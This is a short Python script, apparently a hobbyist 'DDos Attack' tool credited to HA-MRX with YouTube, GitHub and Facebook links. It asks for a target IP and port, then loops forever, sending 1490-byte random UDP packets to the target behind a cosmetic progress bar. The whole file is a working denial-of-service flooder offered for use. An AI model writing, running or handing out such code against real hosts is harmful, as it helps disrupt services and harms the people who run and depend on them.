import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#os.system("figlet DDos Attack")

print(f"\nAuthor   : HA-MRX")
print("You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
print("github   : https://github.com/Ha3MrX")
print(f"Facebook : https://www.facebook.com/muhamad.jabar222\n")

ip = input("IP Target: ")
port = input("Target Port: ")

x = '*'

while True:
     os.system('cls||clear')
     #os.system("figlet Attack Starting")
     for i in range(0, 5):
          yT = i * 25
          print(f"[{x * yT}] {yT}% ")
          time.sleep(0.5)
     sock.sendto(bytes, (ip,int(port)))
     print (f"Sent a packet to {ip} throught port: {port}")

